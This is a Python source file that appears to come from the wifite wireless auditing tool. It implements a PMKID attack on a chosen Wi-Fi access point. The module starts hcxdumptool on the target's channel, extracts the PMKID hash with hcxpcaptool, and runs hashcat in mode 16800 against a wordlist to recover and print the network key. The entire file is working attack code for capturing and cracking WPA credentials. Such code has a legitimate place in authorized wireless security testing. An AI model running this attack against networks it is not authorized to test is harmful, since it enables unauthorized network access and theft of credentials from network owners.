#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time

'''
TODO:
    1. Rename AttackWPA to AttackWpaHandshake
    2. Rename AttackWPS to AttackWpaPixie
    3. Rename AttackPMKID to AttackWpaPMKID
    4. Use AttackWPA to try any or all of the above depending on config/args.
    Greatly simplifies the attack loop in wifite.py
    Or consolidate all attacks under "Attack" which selects the correct attack based on the target.
    Might be hard to capture KeyboardInterrupt, but we can always propagate it.

    Could move a ton of stuff in wifite.py (display_cracked, check_handshake) to a 'util'
'''
class AttackPMKID(Attack):
    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_output = Configuration.temp('pmkid.pcapng')
        self.pmkid_output = Configuration.temp('pmkid.16800')

    def run(self):
        # TODO: Check cracked.txt for previously-captured PMKID, skip to crack if found.
        self.keep_capturing = True
        self.timer = Timer(60)

        # Start hcxdumptool
        t = Thread(target=self.hcxdump_thread)
        t.start()

        # Regularly check hcxpcaptool output for hash for self.target.essid
        pmkid_hash = None
        while self.timer.remaining() > 0:
            pmkid_hash = self.get_pmkid_hash()
            if pmkid_hash is not None:
                # Got PMKID
                break
            Color.pattack('PMKID', self.target, 'capture',
                    'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        if pmkid_hash is not None:
            Color.pattack('PMKID', self.target, str(self.timer), 'Captured PMKID, cracking...')
            # When hash is found, start cracking
            if self.crack_pmkid(pmkid_hash):
                self.success = True

        self.keep_capturing = False

        return self.success

    def crack_pmkid(self, pmkid_hash):
        # Write hash to file
        # TODO: Should we write this to ./hs/ with .pmkid suffix?
        hash_file = Configuration.temp('pmkid.hash')
        with open(hash_file, 'w') as f:
            f.write(pmkid_hash)
            f.write('\n')

        # Run hashcat
        command = [
            'hashcat',
            '--force',
            '--quiet',
            '-m', '16800',
            '-a', '0',  # TODO: Configure
            '-w', '2',  # TODO: Configure
            hash_file,
            Configuration.wordlist
        ]

        # TODO: Check status of hashcat (%); it's impossible with --quiet

        try:
            hashcat_proc = Process(command)
            hashcat_proc.wait()
            stdout = hashcat_proc.stdout()
        except KeyboardInterrupt:  # In case user gets impatient
            stdout = ''

        if ':' not in stdout:
            # Failed
            Color.pattack('PMKID', self.target, '{R}failed', '{O}Failed to crack PMKID    ')
            Color.pl("")
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid, pmkid_hash, None)
            #self.crack_result.dump()
            return False
        else:
            # Update Crack Result
            key = stdout.strip().split(':', 1)[1]
            Color.pl("\n\n{+} Cracked PMKID! Key: {G}%s{W}\n" % key)
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid, pmkid_hash, key)
            self.crack_result.dump()
            return True

    def get_pmkid_hash(self):
        if os.path.exists(self.pmkid_output):
            os.remove(self.pmkid_output)

        command = [
            'hcxpcaptool',
            '-z', self.pmkid_output,
            self.pcapng_output
        ]
        hcxpcap_proc = Process(command)
        hcxpcap_proc.wait()

        if not os.path.exists(self.pmkid_output):
            return None

        with open(self.pmkid_output, 'r') as f:
            output = f.read()

        # Check that we got the right target
        # pmkid_hash*bssid*station_mac*essid(hex)
        for line in output.split('\n'):
            fields = line.split('*')
            if len(fields) < 3:
                continue
            if fields[1].lower() != self.target.bssid.lower().replace(':', ''):
                continue
            output = line
            break

        os.remove(self.pmkid_output)
        return output

    def hcxdump_thread(self):
        # Create filterlist
        filterlist = Configuration.temp('pmkid.filterlist')
        with open(filterlist, 'w') as filter_file:
            filter_file.write(self.target.bssid.replace(':', ''))

        if os.path.exists(self.pcapng_output):
            os.remove(self.pcapng_output)

        command = [
            "hcxdumptool",
            "-i", Configuration.interface,
            "--filterlist", filterlist,
            "--filtermode", "2",
            "-c", self.target.channel,
            "-o", self.pcapng_output
        ]

        hcxdump_proc = Process(command)

        # Let the dump tool run until we have the hash.
        while self.keep_capturing and hcxdump_proc.poll() == None:
            time.sleep(0.5)

        hcxdump_proc.interrupt()
